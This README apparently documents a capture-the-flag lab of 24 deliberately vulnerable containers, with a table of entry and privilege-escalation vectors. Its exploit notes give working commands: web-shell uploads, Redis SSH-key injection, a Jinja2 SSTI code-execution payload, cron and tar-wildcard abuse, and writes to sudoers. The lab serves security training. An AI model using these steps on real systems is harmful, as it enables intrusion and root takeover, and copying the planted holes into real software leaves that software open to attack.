# KoTH CTF Infrastructure - 24 Machines

## Quick Start

```bash
# Build and start all containers
docker compose up -d --build

# Or build/start a single machine
docker compose up -d --build machineH1A

# Reset king.txt to 'unclaimed' on all machines
for c in $(docker compose ps -q); do docker exec $c bash -c "echo unclaimed > /root/king.txt"; done
```

---

## Machine Matrix

| Machine   | Port  | Initial Vector                              | PrivEsc Vector                             |
|-----------|-------|---------------------------------------------|--------------------------------------------|
| machineH1A | 10001 | WordPress Plugin RCE (Reflex Gallery)       | SUID `/usr/bin/find`                       |
| machineH1B | 10002 | Redis Unauthenticated                       | Write SSH key to `/root/.ssh/`             |
| machineH1C | 10004 | Anonymous FTP → shell upload to web root   | World-writable root cronjob script         |
| machineH2A | 10010 | Jenkins Script Console (no auth)           | `sudo python3` (no password)               |
| machineH2B | 10011 | PHP SQL Injection                           | MySQL root with FILE/UDF privileges        |
| machineH2C | 10012 | Tomcat default creds `tomcat:tomcat`        | PwnKit CVE-2021-4034                       |
| machineH3A | 10020 | SMB Anonymous share leaks SSH key          | User in `lxd` group (container breakout)   |
| machineH3B | 10022 | Drupalgeddon2 CVE-2018-7600                | Root cron `tar *` in writable dir          |
| machineH3C | 10023 | Exposed `.git` leaks web creds             | `/usr/bin/perl` has `cap_setuid`           |
| machineH4A | 10030 | Node.js Deserialization (node-serialize)   | Cleartext root pass in `/var/backups/`     |
| machineH4B | 10031 | Spring4Shell CVE-2022-22965                | Root password in `.bash_history`           |
| machineH4C | 10032 | SSRF to internal Node API                  | Internal root API executes commands        |
| machineH5A | 10040 | Webmin RCE CVE-2019-15107                  | Drops directly to root                     |
| machineH5B | 10041 | ElasticSearch Dynamic Scripting RCE        | `www-data` can write `/etc/passwd`         |
| machineH5C | 10042 | Apache Struts CVE-2017-5638               | `sudo` allows `LD_PRELOAD`                 |
| machineH6A | 10050 | distcc CVE-2004-2687                       | NFS `no_root_squash` — write SUID binary   |
| machineH6B | 10052 | MongoDB No Auth (crack hashes)            | `mongouser` in `docker` group              |
| machineH6C | 10053 | Heartbleed CVE-2014-0160 (session leak)    | `sudo systemctl` → spawn shell             |
| machineH7A | 10060 | SNMP Public community leaks processes      | Hijack active root `tmux` session          |
| machineH7B | 10062 | Grafana Path Traversal CVE-2021-43798     | `/etc/shadow` is world-writable            |
| machineH7C | 10063 | RSync anonymous write                      | PATH hijacking in root cron (`ls`)         |
| machineH8A | 10070 | PHPMyAdmin root:blank                      | MySQL UDF for command execution            |
| machineH8B | 10071 | Flask/Jinja2 SSTI                          | `/etc/sudoers` is world-writable           |
| machineH8C | 10072 | Laravel Debug CVE-2021-3129               | SUID `/bin/bash_suid` (`bash_suid -p`)     |

---

## Exploit Notes

### H1A - WordPress + SUID find
```bash
# Initial: Upload PHP shell via Reflex Gallery plugin (no auth check)
curl -X POST http://target:10001/wp-content/plugins/reflex-gallery/reflex-gallery.php?action=UploadHandler \
  -F "file=@shell.php"
# PrivEsc:
/usr/bin/find . -exec /bin/bash -p \; -quit
```

### H1B - Redis + SSH Key Injection
```bash
# Initial: Use redis-cli to write SSH key
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/key.txt
redis-cli -h target:10002 config set dir /root/.ssh/
redis-cli -h target:10002 config set dbfilename authorized_keys
redis-cli -h target:10002 set payload "$(cat /tmp/key.txt)"
redis-cli -h target:10002 save
ssh root@target -p 10003
```

### H1C - Anonymous FTP + Cronjob
```bash
# Initial: Upload PHP shell via anonymous FTP to web root
ftp target 10004  # login: anonymous
put shell.php /pub/webroot/shell.php
curl http://target:10005/shell.php?cmd=id
# PrivEsc: write to /opt/scripts/maintenance.sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /opt/scripts/maintenance.sh
# Wait 1 minute, then: /tmp/rootbash -p
```

### H3C - git + perl cap_setuid
```bash
# Initial: Reconstruct .git to find leaked credentials
git clone http://target:10023/.git ./recovered
git -C ./recovered log --all -p | grep PASS
# PrivEsc: perl cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### H3B - Drupalgeddon2 + tar wildcard
```bash
# Initial: Use droopescan or PoC exploit for CVE-2018-7600
python3 drupalgeddon2.py http://target:10022/
# PrivEsc: tar wildcard in /opt/backups
echo "" > /opt/backups/--checkpoint=1
echo "" > /opt/backups/--checkpoint-action=exec=sh\ shell.sh
echo 'cp /bin/bash /tmp/r; chmod +s /tmp/r' > /opt/backups/shell.sh
# Wait for cron, then: /tmp/r -p
```

### H7C - RSync + PATH Hijacking
```bash
# Initial: rsync anonymously, write a malicious 'ls' to /opt/tools/
echo '#!/bin/bash' > /tmp/ls_payload
echo 'cp /bin/bash /tmp/rootsh; chmod +s /tmp/rootsh' >> /tmp/ls_payload
chmod +x /tmp/ls_payload
rsync /tmp/ls_payload rsync://target:10063/public/ls
# Wait for cron, then: /tmp/rootsh -p
```

### H8B - Jinja2 SSTI + writable sudoers
```bash
# Initial: Exploit SSTI
curl "http://target:10071/?name={{config}}"
# RCE payload:
curl "http://target:10071/?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
# PrivEsc: sudoers is 666
echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo /bin/bash
```

---

## Resetting Between Rounds
```bash
# Reset all king files
docker compose exec machineH1A bash -c "echo unclaimed > /root/king.txt"
# ... or use a loop:
for machine in machineH{1..8}{A,B,C}; do
  docker compose exec $machine bash -c "echo unclaimed > /root/king.txt" 2>/dev/null
done
```

## Notes
- Containers that use `--stub` servers (H5A, H5B, H5C, H6C, H7A, H7B) simulate the CVE  
  behavior in Python. Real vulnerable binaries can be substituted by downloading specific  
  versions and replacing the stub.
- H6B mounts `/var/run/docker.sock` for the docker group PrivEsc — ensure the host docker  
  socket is present.
- H3A requires `cap_add: SYS_ADMIN` for Samba name services.
